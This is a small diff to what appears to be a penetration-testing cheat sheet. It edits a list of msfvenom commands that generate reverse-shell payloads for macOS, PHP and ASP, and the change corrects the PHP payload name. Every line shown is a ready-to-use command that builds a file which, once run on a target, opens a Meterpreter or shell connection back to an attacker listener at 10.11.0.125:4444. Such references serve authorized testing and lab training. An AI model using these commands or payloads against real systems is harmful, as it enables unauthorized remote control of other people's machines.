@@ -10,7 +10,7 @@
 >msfvenom -p osx/x86/shell_reverse_tcp LHOST=10.11.0.125 LPORT=4444 -f macho > shell.macho 
 
 **PHP**
->msfvenom -p php/meterpreter_reverse_tcp LHOST=10.11.0.125 LPORT=4444 -f raw > shell.php
+>msfvenom -p php/meterpreter/reverse_tcp LHOST=10.11.0.125 LPORT=4444 -f raw > shell.php
 
 **ASP**
 >msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.125 LPORT=4444 -f asp > shell.asp
